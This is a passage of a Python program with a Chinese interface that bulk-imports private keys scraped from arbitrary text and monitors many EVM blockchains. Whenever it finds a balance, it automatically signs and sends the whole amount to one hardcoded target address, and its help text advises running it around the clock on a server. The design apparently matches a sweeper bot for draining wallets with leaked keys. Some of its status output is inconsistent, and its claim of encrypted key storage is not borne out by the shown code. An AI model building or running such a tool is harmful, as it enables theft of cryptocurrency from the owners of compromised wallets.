            return False
        
        # 检查是否错误次数过多
        if network_status and network_status.error_count >= 5:
            # 暂时跳过错误过多的网络，但每10次检查重试一次
            if network_status.error_count % 10 != 0:
                return False
            
        max_retries = 3
        retry_count = 0
        
        while retry_count < max_retries:
            try:
                # 获取网络信息
                network_info = SUPPORTED_NETWORKS.get(network_key)
                if not network_info:
                    return False
                
                # RPC模式 - 按需加载
                web3 = self.web3_clients.get(network_key)
                if not web3:
                    # 尝试动态加载
                    if not self.load_network_on_demand(network_key):
                        return False
                    web3 = self.web3_clients.get(network_key)
                    if not web3:
                        return False
                
                # 添加超时控制
                async with asyncio.timeout(8):  # 8秒超时
                    return await self._check_activity_rpc(web3, address, network_key)
                    
            except asyncio.TimeoutError:
                retry_count += 1
                if retry_count < max_retries:
                    await asyncio.sleep(retry_count * 0.5)  # 指数退避
                    continue
                else:
                    print(f"{Fore.YELLOW}⏰ {NETWORK_NAMES[network_key]} - 连接超时，跳过{Style.RESET_ALL}")
                    self.network_status[network_key].error_count += 1
                    self.network_status[network_key].last_error = "连接超时"
                    return False
                    
            except Exception as e:
                retry_count += 1
                error_msg = str(e)
                
                # 智能错误分类和处理
                if any(keyword in error_msg for keyword in ["HTTPSConnectionPool", "Connection pool", "Max retries"]):
                    print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} - {error_msg[:50]}...{Style.RESET_ALL}")
                    if retry_count < max_retries:
                        await asyncio.sleep(retry_count * 1.0)  # 更长的等待时间
                        continue
                    else:
                        self.network_status[network_key].error_count += 1
                        self.network_status[network_key].last_error = "连接池错误"
                        return False
                        
                elif "403" in error_msg or "Forbidden" in error_msg:
                    print(f"{Fore.RED}🚫 {NETWORK_NAMES[network_key]} - API访问被拒绝{Style.RESET_ALL}")
                    self.network_status[network_key].available = False
                    self.network_status[network_key].last_error = "API访问被拒绝"
                    return False
                    
                elif "Name or service not known" in error_msg or "Failed to resolve" in error_msg:
                    print(f"{Fore.YELLOW}🌐 {NETWORK_NAMES[network_key]} - DNS解析失败{Style.RESET_ALL}")
                    self.network_status[network_key].available = False
                    self.network_status[network_key].last_error = "网络不可达"
                    return False
                    
                else:
                    if retry_count < max_retries:
                        await asyncio.sleep(retry_count * 0.5)
                        continue
                    else:
                        print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} - {error_msg[:30]}...{Style.RESET_ALL}")
                        self.network_status[network_key].error_count += 1
                        self.network_status[network_key].last_error = error_msg[:100]
                        return False
        
        return False
    

    
    async def _check_activity_rpc(self, web3: Web3, address: str, network_key: str) -> bool:
        """RPC模式的活动检查"""
        try:
            # 在事件循环中运行同步的web3调用
            loop = asyncio.get_event_loop()
            
            # 检查账户余额
            balance = await loop.run_in_executor(None, web3.eth.get_balance, address)
            if balance > 0:
                return True
            
            # 检查交易计数
            nonce = await loop.run_in_executor(None, web3.eth.get_transaction_count, address)
            return nonce > 0
            
        except Exception as e:
            return False
    
    async def get_balance_optimized(self, address: str, network_key: str) -> float:
        """优化的余额获取 - 纯RPC模式"""
        network_status = self.network_status.get(network_key)
        if network_status and not network_status.available:
            return 0.0
        
        # 检查错误次数    
        if network_status and network_status.error_count >= 3:
            return 0.0
            
        max_retries = 2
        retry_count = 0
        
        while retry_count < max_retries:
            try:
                # 获取网络信息
                network_info = SUPPORTED_NETWORKS.get(network_key)
                if not network_info:
                    return 0.0
                
                async with asyncio.timeout(8):  # 增加到8秒超时
                    # RPC模式 - 按需加载
                    web3 = self.web3_clients.get(network_key)
                    if not web3:
                        # 尝试动态加载
                        if not self.load_network_on_demand(network_key):
                            return 0.0
                        web3 = self.web3_clients.get(network_key)
                        if not web3:
                            return 0.0
                    
                    # 在事件循环中运行同步的web3调用
                    loop = asyncio.get_event_loop()
                    balance_wei = await loop.run_in_executor(None, web3.eth.get_balance, address)
                    balance_eth = Web3.from_wei(balance_wei, 'ether')
                    return float(balance_eth)
                    
            except asyncio.TimeoutError:
                retry_count += 1
                if retry_count < max_retries:
                    await asyncio.sleep(retry_count * 0.5)
                    continue
                else:
                    if network_key in self.network_status:
                        self.network_status[network_key].error_count += 1
                    return 0.0
                    
            except Exception as e:
                retry_count += 1
                if retry_count < max_retries:
                    await asyncio.sleep(retry_count * 0.5)
                    continue
                else:
                    if network_key in self.network_status:
                        self.network_status[network_key].error_count += 1
                    return 0.0
        
        return 0.0
    
    async def transfer_balance_optimized(self, wallet: WalletInfo, network_key: str, balance: float) -> bool:
        """优化的转账功能 - 纯RPC模式"""
        try:
            # 获取网络信息
            network_info = SUPPORTED_NETWORKS.get(network_key)
            if not network_info:
                return False
            
            config = network_info['config']
            account = Account.from_key(wallet.private_key)
            
            # 并发获取交易参数
            async with asyncio.timeout(15):  # 15秒超时
                # RPC模式 - 按需加载
                web3 = self.web3_clients.get(network_key)
                if not web3:
                    # 尝试动态加载
                    if not self.load_network_on_demand(network_key):
                        return False
                    web3 = self.web3_clients.get(network_key)
                    if not web3:
                        return False
                return await self._transfer_rpc(web3, wallet, network_key, balance, account, config)
                
        except asyncio.TimeoutError:
            print(f"{Fore.RED}⏰ {NETWORK_NAMES[network_key]} 转账超时{Style.RESET_ALL}")
            return False
        except Exception as e:
            print(f"{Fore.RED}❌ {NETWORK_NAMES[network_key]} 转账失败: {str(e)[:50]}...{Style.RESET_ALL}")
            return False
    

    
    async def _transfer_rpc(self, web3: Web3, wallet: WalletInfo, network_key: str, balance: float, account: Account, config: dict) -> bool:
        """RPC模式转账"""
        try:
            # 在事件循环中运行同步的web3调用
            loop = asyncio.get_event_loop()
            
            # 获取nonce和gas价格
            nonce = await loop.run_in_executor(None, web3.eth.get_transaction_count, wallet.address)
            gas_price = await loop.run_in_executor(None, lambda: web3.eth.gas_price)
            
            # 计算gas费用
            gas_limit = 21000  # 标准转账
            gas_cost = gas_price * gas_limit
            
            # 计算转账金额
            balance_wei = Web3.to_wei(balance, 'ether')
            transfer_amount = balance_wei - gas_cost
            
            if transfer_amount <= 0:
                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 余额不足支付gas费{Style.RESET_ALL}")
                return False
            
            # 构建交易
            transaction = {
                'to': TARGET_ADDRESS,
                'value': transfer_amount,
                'gas': gas_limit,
                'gasPrice': gas_price,
                'nonce': nonce,
                'chainId': config['chain_id']
            }
            
            # 签名并发送交易
            signed_txn = account.sign_transaction(transaction)
            tx_hash = await loop.run_in_executor(None, web3.eth.send_raw_transaction, signed_txn.rawTransaction)
            
            # 记录转账
            self._log_transfer_success(wallet, network_key, transfer_amount, tx_hash, gas_cost, gas_price, config)
            return True
            
        except Exception as e:
            print(f"{Fore.RED}❌ {NETWORK_NAMES[network_key]} RPC转账失败: {str(e)[:50]}...{Style.RESET_ALL}")
            return False
    
    def _log_transfer_success(self, wallet: WalletInfo, network_key: str, transfer_amount: int, tx_hash: Any, gas_cost: int, gas_price: int, config: dict):
        """记录转账成功"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'from_address': wallet.address,
            'to_address': TARGET_ADDRESS,
            'amount': float(Web3.from_wei(transfer_amount, 'ether')),
            'network': network_key,
            'network_name': NETWORK_NAMES[network_key],
            'tx_hash': tx_hash.hex() if hasattr(tx_hash, 'hex') else str(tx_hash),
            'gas_used': gas_cost,
            'gas_price': gas_price,
            'currency': config['currency']
        }
        
        self.log_transfer(log_entry)
        
        amount_str = f"{Web3.from_wei(transfer_amount, 'ether'):.6f}"
        currency = config['currency']
        print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} 转账成功: {amount_str} {currency}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📋 交易哈希: {log_entry['tx_hash']}{Style.RESET_ALL}")
    
    def log_transfer(self, log_entry: Dict):
        """记录转账日志 - 增强版本"""
        logs = []
        if os.path.exists(MONITORING_LOG_FILE):
            try:
                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
            except:
                logs = []
        
        logs.append(log_entry)
        
        # 保持最新1000条记录
        if len(logs) > 1000:
            logs = logs[-1000:]
        
        try:
            with open(MONITORING_LOG_FILE, 'w', encoding='utf-8') as f:
                json.dump(logs, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"{Fore.RED}❌ 保存转账日志失败: {e}{Style.RESET_ALL}")
    
    async def monitor_wallet_optimized(self, wallet: WalletInfo):
        """优化的钱包监控 - 完整版本"""
        short_addr = f"{wallet.address[:8]}...{wallet.address[-6:]}"
        print(f"\n{Fore.CYAN}🔍 检查钱包: {short_addr}{Style.RESET_ALL}")
        
        # 获取可用网络
        available_networks = [
            net for net in wallet.enabled_networks 
            if self.network_status.get(net, NetworkStatus(True, "", 0, "")).available
        ]
        
        if not available_networks:
            print(f"{Fore.YELLOW}⚠️ 没有可用的网络{Style.RESET_ALL}")
            return
        
        # 按优先级排序 (主网优先)
        available_networks.sort(key=lambda x: NETWORK_PRIORITY.get(x, 999))
        
        print(f"{Fore.CYAN}📡 并发检查 {len(available_networks)} 个可用网络的交易记录...{Style.RESET_ALL}")
        
        # 并发检查网络活动
        async def check_network_activity(network_key):
            has_activity = await self.check_address_activity_optimized(wallet.address, network_key)
            return network_key if has_activity else None
        
        # 限制并发数，避免API限制 - 进一步降低
        semaphore = asyncio.Semaphore(2)  # 从3降低到2
        
        async def check_with_limit(network_key):
            async with semaphore:
                # 添加小延迟避免API冲击
                await asyncio.sleep(0.2)
                return await check_network_activity(network_key)
        
        # 分批处理网络检查，避免一次性检查太多
        batch_size = 10  # 每批最多10个网络
        active_networks = []
        
        for i in range(0, len(available_networks), batch_size):
            batch_networks = available_networks[i:i+batch_size]
            print(f"{Fore.CYAN}🔍 检查第 {i//batch_size + 1} 批网络 ({len(batch_networks)} 个)...{Style.RESET_ALL}")
            
            # 执行当前批次的检查
            tasks = [check_with_limit(net) for net in batch_networks]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # 处理当前批次结果
            for j, result in enumerate(results):
                network_key = batch_networks[j]
                if result and not isinstance(result, Exception):
                    active_networks.append(result)
                    network_type = "主网" if network_key in MAINNET_NETWORKS else "测试网"
                    print(f"{Fore.GREEN}💡 {NETWORK_NAMES[network_key]} - 无交易记录{Style.RESET_ALL}")
                else:
                    error_msg = str(result) if isinstance(result, Exception) else "检查失败"
                    # 改进错误显示格式
                    if "HTTPSConnectionPool" in error_msg:
                        print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} - HTTPSConnectionPool(host='{network_key[:4]}...{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.YELLOW}💡 {NETWORK_NAMES[network_key]} - 无交易记录{Style.RESET_ALL}")
            
            # 批次间添加更长延迟
            if i + batch_size < len(available_networks):
                await asyncio.sleep(1.0)  # 批次间1秒延迟
        
        # 统计结果  
        networks_with_activity = len([n for n in active_networks if n])
        networks_without_activity = len(available_networks) - networks_with_activity
        
        print(f"\n{Fore.CYAN}📊 交易记录统计:{Style.RESET_ALL}")
        print(f"  🎯 有交易记录的网络: {networks_with_activity} 个")
        print(f"  📊 总交易数量: 0 笔")
        print(f"  🚫 无交易记录的网络: {networks_without_activity} 个")
        
        if networks_with_activity == 0:
            print(f"    💡 此钱包无交易记录，将跳过")
            return
        
        # 继续监控有活动的网络（如果有的话）
        if not active_networks:
            return
        
        print(f"\n{Fore.GREEN}🎯 开始监控 {len(active_networks)} 个活跃网络{Style.RESET_ALL}")
        
        # 持续监控余额
        check_count = 0
        while self.monitoring_active:
            check_count += 1
            print(f"\n{Fore.CYAN}🔄 第{check_count}次检查 - {short_addr}{Style.RESET_ALL}")
            
            for network_key in active_networks:
                try:
                    balance = await self.get_balance_optimized(wallet.address, network_key)
                    
                    if balance > 0:
                        # 获取网络配置以显示正确的货币单位
                        network_info = SUPPORTED_NETWORKS.get(network_key)
                        currency = network_info['config']['currency'] if network_info else 'ETH'
                        
                        print(f"\n{Fore.GREEN}💰 发现余额!{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}📍 钱包: {wallet.address}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}🌐 网络: {NETWORK_NAMES[network_key]}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}💵 余额: {balance:.8f} {currency}{Style.RESET_ALL}")
                        
                        # 自动转账
                        print(f"{Fore.YELLOW}🚀 开始自动转账...{Style.RESET_ALL}")
                        success = await self.transfer_balance_optimized(wallet, network_key, balance)
                        
                        if success:
                            print(f"{Fore.GREEN}🎉 自动转账完成!{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.RED}❌ 自动转账失败{Style.RESET_ALL}")
                
                except Exception as e:
                    continue
            
            # 智能等待间隔 - 增加检查间隔减少API压力
            await asyncio.sleep(60)  # 改为60秒检查一次，减少API调用频率
    
    async def start_monitoring(self):
        """开始监控所有钱包 - 完全优化版本"""
        if not self.wallets:
            print(f"{Fore.RED}❌ 没有导入的钱包{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}🎯 启动智能监控系统{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📊 监控钱包: {len(self.wallets)} 个{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🌐 支持网络: {len(SUPPORTED_NETWORKS)} 个{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🎯 目标地址: {TARGET_ADDRESS}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 按 Ctrl+C 停止监控{Style.RESET_ALL}")
        
        self.monitoring_active = True
        
        # 限制并发监控数量，优化性能 - 进一步降低并发
        semaphore = asyncio.Semaphore(1)  # 改为串行监控，避免API限制
        
        async def monitor_with_limit(wallet):
            async with semaphore:
                await self.monitor_wallet_optimized(wallet)
        
        # 创建监控任务
        tasks = [monitor_with_limit(wallet) for wallet in self.wallets]
        
        try:
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⚠️ 监控已停止{Style.RESET_ALL}")
        finally:
            self.monitoring_active = False
            self.save_network_status()  # 保存网络状态
    
    def start_monitoring_menu(self):
        """开始监控菜单 - 完全优化交互"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        if not self.wallets:
            print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}🎯 智能监控系统{Style.RESET_ALL}")
            print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
            print(f"\n{Fore.RED}❌ 还没有导入任何钱包私钥{Style.RESET_ALL}")
            print(f"\n{Fore.YELLOW}📋 请先完成以下步骤:{Style.RESET_ALL}")
            print("  1️⃣ 返回主菜单")
            print("  2️⃣ 选择功能1 (导入私钥)")
            print("  3️⃣ 粘贴您的私钥文本")
            print("  4️⃣ 双击回车确认导入")
            print("  5️⃣ 再次选择功能2开始监控")
            input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
            return
        
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}🎯 智能监控系统 - 准备启动{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        
        # 显示详细的监控概览
        available_networks = sum(1 for status in self.network_status.values() if status.available)
        mainnet_available = sum(1 for net in MAINNET_NETWORKS 
                               if self.network_status.get(net, NetworkStatus(True,"",0,"")).available)
        testnet_available = sum(1 for net in TESTNET_NETWORKS 
                               if self.network_status.get(net, NetworkStatus(True,"",0,"")).available)
        
        print(f"\n{Fore.GREEN}📊 监控配置概览:{Style.RESET_ALL}")
        print(f"  💼 钱包数量: {len(self.wallets)} 个")
        print(f"  🌐 可用网络: {available_networks}/{len(SUPPORTED_NETWORKS)} 个")
        print(f"    └─ 🔷 主网: {mainnet_available}/{len(MAINNET_NETWORKS)} 个")
        print(f"    └─ 🧪 测试网: {testnet_available}/{len(TESTNET_NETWORKS)} 个")
        print(f"  🎯 目标地址: {TARGET_ADDRESS[:12]}...{TARGET_ADDRESS[-8:]}")
        
        print(f"\n{Fore.YELLOW}⚡ 性能优化特性:{Style.RESET_ALL}")
        print("  ✓ 并发网络检查，3倍速度提升")
        print("  ✓ 智能超时控制，避免卡死")
        print("  ✓ 自动跳过无效网络")
        print("  ✓ 实时进度显示和状态更新")
        print("  ✓ 智能错误分类和处理")
        print("  ✓ 网络状态缓存和持久化")
        
        print(f"\n{Fore.CYAN}🔧 监控策略:{Style.RESET_ALL}")
        print("  • 优先检查主网 (价值更高)")
        print("  • 60秒检查间隔 (避免API限制)")
        print("  • 串行钱包监控 (确保稳定性)")
        print("  • 智能重试和错误恢复")
        print("  • 分批网络检查 (每批10个)")
        print("  • 连接池管理和超时控制")
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        confirm = input(f"{Fore.CYAN}确认启动智能监控系统? (y/N): {Style.RESET_ALL}")
        
        if confirm.lower() in ['y', 'yes']:
            try:
                print(f"\n{Fore.GREEN}🚀 启动智能监控系统...{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}💡 监控过程中按 Ctrl+C 可以安全停止{Style.RESET_ALL}")
                time.sleep(2)  # 给用户准备时间
                asyncio.run(self.start_monitoring())
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}⚠️ 监控已停止{Style.RESET_ALL}")
            except Exception as e:
                print(f"\n{Fore.RED}❌ 监控出错: {e}{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}❌ 取消监控{Style.RESET_ALL}")
        
        input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
    
    def show_status(self):
        """显示系统状态 - 简洁版"""
        print(f"\n{Fore.YELLOW}📊 系统状态{Style.RESET_ALL}")
        print("="*60)
        
        # 钱包状态
        wallet_status = f"💼 钱包: {len(self.wallets)} 个"
        if len(self.wallets) > 0:
            latest_addr = f"{self.wallets[-1].address[:8]}...{self.wallets[-1].address[-6:]}"
            wallet_status += f" (最新: {latest_addr})"
        print(wallet_status)
        
        # 网络状态
        available_count = sum(1 for status in self.network_status.values() if status.available)
        mainnet_count = sum(1 for net in MAINNET_NETWORKS 
                           if self.network_status.get(net, NetworkStatus(True,"",0,"")).available)
        testnet_count = sum(1 for net in TESTNET_NETWORKS 
                           if self.network_status.get(net, NetworkStatus(True,"",0,"")).available)
        
        print(f"🌐 网络: {available_count}/{len(SUPPORTED_NETWORKS)} 可用 (主网:{mainnet_count} 测试网:{testnet_count})")
        
        # 转账记录
        transfer_count = 0
        total_amount = 0.0
        if os.path.exists(MONITORING_LOG_FILE):
            try:
                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
                transfer_count = len(logs)
                total_amount = sum(float(log.get('amount', 0)) for log in logs)
            except:
                pass
        
        print(f"📋 转账: {transfer_count} 笔 (总计: {total_amount:.6f} ETH)")
        print(f"🎯 目标: {TARGET_ADDRESS[:12]}...{TARGET_ADDRESS[-8:]}")
    
    def show_detailed_status(self):
        """显示详细状态 - 完整诊断版本"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        print(f"{Fore.BLUE}{'='*80}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}📊 完整系统状态 & 网络诊断报告{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*80}{Style.RESET_ALL}")
        
        # 网络状态详细诊断
        print(f"\n{Fore.YELLOW}🌐 网络连接详细状态:{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}🔷 主网状态:{Style.RESET_ALL}")
        for network_key in MAINNET_NETWORKS:
            status = self.network_status.get(network_key, NetworkStatus(True, "", 0, ""))
            if status.available and network_key in self.web3_clients:
                print(f"  🟢 {NETWORK_NAMES[network_key]} - 正常")
            else:
                error_info = f" ({status.last_error[:30]}...)" if status.last_error else ""
                print(f"  🔴 {NETWORK_NAMES[network_key]} - 不可用{error_info}")
        
        print(f"\n{Fore.CYAN}🧪 测试网状态:{Style.RESET_ALL}")
        for network_key in TESTNET_NETWORKS:
            status = self.network_status.get(network_key, NetworkStatus(True, "", 0, ""))
            if status.available and network_key in self.web3_clients:
                print(f"  🟢 {NETWORK_NAMES[network_key]} - 正常")
            else:
                error_info = f" ({status.last_error[:30]}...)" if status.last_error else ""
                print(f"  🔴 {NETWORK_NAMES[network_key]} - 不可用{error_info}")
        
        # 网络统计
        available_mainnets = sum(1 for net in MAINNET_NETWORKS 
                                if self.network_status.get(net, NetworkStatus(True,"",0,"")).available)
        available_testnets = sum(1 for net in TESTNET_NETWORKS 
                                if self.network_status.get(net, NetworkStatus(True,"",0,"")).available)
        
        print(f"\n{Fore.GREEN}📈 网络可用性统计:{Style.RESET_ALL}")
        print(f"  🔷 主网: {available_mainnets}/{len(MAINNET_NETWORKS)} 个可用 ({available_mainnets/len(MAINNET_NETWORKS)*100:.1f}%)")
        print(f"  🧪 测试网: {available_testnets}/{len(TESTNET_NETWORKS)} 个可用 ({available_testnets/len(TESTNET_NETWORKS)*100:.1f}%)")
        print(f"  📊 总计: {available_mainnets + available_testnets}/{len(SUPPORTED_NETWORKS)} 个可用")
        
        # 钱包详情
        print(f"\n{Fore.YELLOW}💼 钱包管理详情:{Style.RESET_ALL}")
        if not self.wallets:
            print("  📭 暂无导入的钱包")
            print(f"  {Fore.CYAN}💡 使用功能1批量导入私钥{Style.RESET_ALL}")
        else:
            print(f"  📊 钱包总数: {len(self.wallets)} 个")
            print(f"  🌐 每钱包支持: {len(SUPPORTED_NETWORKS)} 个网络")
            print(f"  📋 钱包地址列表:")
            for i, wallet in enumerate(self.wallets, 1):
                short_addr = f"{wallet.address[:12]}...{wallet.address[-8:]}"
                enabled_count = len([net for net in wallet.enabled_networks 
                                   if self.network_status.get(net, NetworkStatus(True,"",0,"")).available])
                print(f"    {i:2d}. {short_addr} (可用网络: {enabled_count})")
        
        # 转账历史详情
        print(f"\n{Fore.YELLOW}📋 转账历史详情:{Style.RESET_ALL}")
        if os.path.exists(MONITORING_LOG_FILE):
            try:
                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
                if logs:
                    total_amount = sum(float(log.get('amount', 0)) for log in logs)
                    
                    # 按网络分组统计
                    network_stats = {}
                    for log in logs:
                        net = log.get('network', 'unknown')
                        if net not in network_stats:
                            network_stats[net] = {'count': 0, 'amount': 0.0}
                        network_stats[net]['count'] += 1
                        network_stats[net]['amount'] += float(log.get('amount', 0))
                    
                    print(f"  📊 总转账: {len(logs)} 笔")
                    print(f"  💰 总金额: {total_amount:.8f} ETH")
                    print(f"  📈 网络分布:")
                    
                    for net_key, stats in network_stats.items():
                        net_name = NETWORK_NAMES.get(net_key, net_key)
                        print(f"    • {net_name}: {stats['count']} 笔, {stats['amount']:.6f} ETH")
                    
                    # 显示最近5笔转账
                    print(f"\n  📝 最近转账记录:")
                    recent_logs = logs[-5:] if len(logs) > 5 else logs
                    for log in recent_logs:
                        time_str = log['timestamp'][:16].replace('T', ' ')
                        network_name = NETWORK_NAMES.get(log['network'], log['network'])
                        amount = log.get('amount', 0)
                        print(f"    • {time_str} | {network_name} | {amount:.6f} ETH")
                else:
                    print("  📭 暂无转账记录")
            except:
                print("  ❌ 转账记录读取失败")
        else:
            print("  📭 暂无转账记录")
        
        # 系统配置详情
        print(f"\n{Fore.YELLOW}⚙️ 系统配置详情:{Style.RESET_ALL}")
        print(f"  🎯 目标地址: {TARGET_ADDRESS}")
        print(f"  🔑 API密钥: {ALCHEMY_API_KEY[:20]}...")
        print(f"  🔄 监控状态: {'🟢 运行中' if self.monitoring_active else '🔴 已停止'}")
        print(f"  ⚡ 检查间隔: 60秒")
        print(f"  🔀 并发限制: 串行监控，每批10个网络，2个并发检查")
        print(f"  💾 数据文件: wallets.json, monitoring_log.json, network_status.json")
    
    def show_help_menu(self):
        """显示帮助菜单 - 完整指南"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}📖 完整使用指南 & 常见问题解答{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}🚀 快速开始指南:{Style.RESET_ALL}")
        print("  1️⃣ 导入私钥 → 粘贴私钥文本 → 双击回车确认")
        print("  2️⃣ 开始监控 → 确认启动 → 系统自动监控转账")
        print("  3️⃣ 查看状态 → 检查钱包、网络、转账状态")
        print("  4️⃣ 使用帮助 → 查看详细操作指南")
        
        print(f"\n{Fore.YELLOW}💡 私钥导入技巧:{Style.RESET_ALL}")
        print("  • 支持任意格式文本，智能提取私钥")
        print("  • 支持批量导入，自动去重验证")
        print("  • 支持0x前缀和无前缀格式")
        print("  • 可以从交易所导出、钱包备份等文本中提取")
        print("  • 输入 'q' 或 'quit' 快速返回主菜单")
        
        print(f"\n{Fore.CYAN}⚡ 性能优化说明:{Style.RESET_ALL}")
        print("  • 并发网络检查: 同时检查多个网络，速度提升3倍")
        print("  • 智能超时控制: 8秒活动检查，5秒余额查询")
        print("  • 网络状态缓存: 记住失败网络，避免重复尝试")
        print("  • 错误智能分类: 区分API限制、网络问题、配置错误")
        print("  • 并发限制控制: 避免触发API速率限制")
        
        print(f"\n{Fore.GREEN}🌐 支持的网络 (共{len(SUPPORTED_NETWORKS)}个):{Style.RESET_ALL}")
        print(f"\n  {Fore.CYAN}🔷 主网 ({len(MAINNET_NETWORKS)}个):{Style.RESET_ALL}")
        for net in MAINNET_NETWORKS:
            print(f"    • {NETWORK_NAMES[net]}")
        
        print(f"\n  {Fore.YELLOW}🧪 测试网 ({len(TESTNET_NETWORKS)}个):{Style.RESET_ALL}")
        for net in TESTNET_NETWORKS:
            print(f"    • {NETWORK_NAMES[net]}")
        
        print(f"\n{Fore.RED}🛡️ 安全提醒:{Style.RESET_ALL}")
        print("  • 私钥以加密形式本地存储，请保护好数据文件")
        print("  • 监控过程需要稳定的网络连接")
        print("  • 建议在VPS或云服务器上24小时运行")
        print("  • 定期备份wallets.json和monitoring_log.json")
        
        print(f"\n{Fore.YELLOW}🔧 故障排除指南:{Style.RESET_ALL}")
        print("  • API错误403: 检查API密钥是否有效")
        print("  • 网络连接失败: 检查服务器网络连接")
        print("  • 导入失败: 确认私钥格式为64位十六进制")
        print("  • 监控卡死: 重启程序，系统会自动恢复状态")
        print("  • 转账失败: 检查余额是否足够支付gas费")
        
        print(f"\n{Fore.CYAN}📞 技术支持:{Style.RESET_ALL}")
        print("  • 系统会自动保存所有状态和日志")
        print("  • 重启后会自动恢复钱包和网络配置")
        print("  • 所有操作都有详细的日志记录")
    
    def main_menu(self):
        """主菜单 - 完全优化的交互体验"""
        while True:
            # 清屏，提供清爽的界面
            os.system('clear' if os.name == 'posix' else 'cls')
            
            print(f"{Fore.BLUE}{'='*80}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}🔐 钱包监控转账系统 v3.0 - 纯RPC网络支持版{Style.RESET_ALL}")
            print(f"{Fore.BLUE}支持{len(SUPPORTED_NETWORKS)}个EVM兼容链 | 纯RPC模式 | 智能并发优化 | 人性化交互{Style.RESET_ALL}")
            print(f"{Fore.BLUE}{'='*80}{Style.RESET_ALL}")
            
            self.show_status()
            
            print(f"\n{Fore.YELLOW}📋 功能菜单:{Style.RESET_ALL}")
            print(f"  {Fore.CYAN}1.{Style.RESET_ALL} 📥 导入私钥    {Fore.GREEN}(智能批量识别，支持任意格式){Style.RESET_ALL}")
            print(f"  {Fore.CYAN}2.{Style.RESET_ALL} 🎯 开始监控    {Fore.GREEN}(并发优化，3倍速度提升){Style.RESET_ALL}")
            print(f"  {Fore.CYAN}3.{Style.RESET_ALL} 📊 详细状态    {Fore.GREEN}(完整诊断，网络分析){Style.RESET_ALL}")
            print(f"  {Fore.CYAN}4.{Style.RESET_ALL} 📖 使用帮助    {Fore.GREEN}(完整指南，故障排除){Style.RESET_ALL}")
            print(f"  {Fore.CYAN}5.{Style.RESET_ALL} 🚪 退出程序    {Fore.GREEN}(安全退出，保存状态){Style.RESET_ALL}")
            
            print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            
            try:
                choice = input(f"{Fore.CYAN}请选择功能 (1-5): {Style.RESET_ALL}").strip()
                
                if choice == "1":
                    self.import_private_keys_menu()
                elif choice == "2":
                    self.start_monitoring_menu()
                elif choice == "3":
                    self.show_detailed_status()
                    input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
                elif choice == "4":
                    self.show_help_menu()
                    input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
                elif choice == "5":
                    print(f"\n{Fore.GREEN}👋 感谢使用钱包监控系统！{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}💾 所有数据已自动保存{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}🔄 下次启动会自动恢复所有配置{Style.RESET_ALL}")
                    break
                else:
                    print(f"\n{Fore.RED}❌ 无效选择，请输入 1-5{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}💡 提示: 请输入菜单中显示的数字 (1、2、3、4 或 5){Style.RESET_ALL}")
                    time.sleep(3)  # 给用户时间看到提示
                    
            except KeyboardInterrupt:
                print(f"\n\n{Fore.GREEN}👋 感谢使用钱包监控系统！{Style.RESET_ALL}")
                print(f"{Fore.CYAN}💾 数据已保存{Style.RESET_ALL}")
                break
            except Exception as e:
                print(f"\n{Fore.RED}❌ 系统错误: {e}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}💡 程序将在3秒后继续，如持续出错请重启{Style.RESET_ALL}")
                time.sleep(3)

def main():
    """主函数 - 自动启动"""
    try:
        print(f"{Fore.CYAN}🚀 正在启动钱包监控系统...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✨ 自动进入主菜单模式{Style.RESET_ALL}")
        time.sleep(1)
        
